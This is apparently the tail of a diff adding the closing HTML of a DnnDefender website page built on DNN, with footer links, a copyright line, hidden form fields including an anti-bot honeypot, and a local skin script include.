+          <div class="footer-terms-privacy">
+            <a id="dnn_dnnTerms_hypTerms" class="aperture-terms" rel="nofollow" href="https://dnndefender.com/Terms">Terms Of Use</a><a id="dnn_dnnPrivacy_hypPrivacy" class="SkinObject" rel="nofollow" href="https://dnndefender.com/Privacy">Privacy Statement</a>
+          </div>
+          <div class="footer-copyright">
+            <span id="dnn_dnnCopyright_lblCopyright" class="SkinObject">Copyright 2026 by DnnDefender</span>
+
+          </div>
+        </div>
+        <div id="dnn_FooterPane" class="footer-right DNNEmptyPane"></div>
+      </div>
+    </div>
+  </div>
+</footer>
+</div>
+
+        <input name="ScrollTop" type="hidden" id="ScrollTop" />
+        <input name="__dnnVariable" type="hidden" id="__dnnVariable" autocomplete="off" value="`{`__scdoff`:`1`,`sf_siteRoot`:`/`,`sf_tabId`:`39`}" />
+        
+        <script src="/Portals/_default/Skins/Aperture/js/skin.min.js?cdv=216" type="text/javascript"></script>
+    <input type="hidden" name="__dnn_ts" value="639209143006625819" /><input type="text" name="__dnn_hp" value="" style="display:none !important;position:absolute;left:-9999px;" tabindex="-1" autocomplete="off" /></form>
+    
+</body>
+</html>
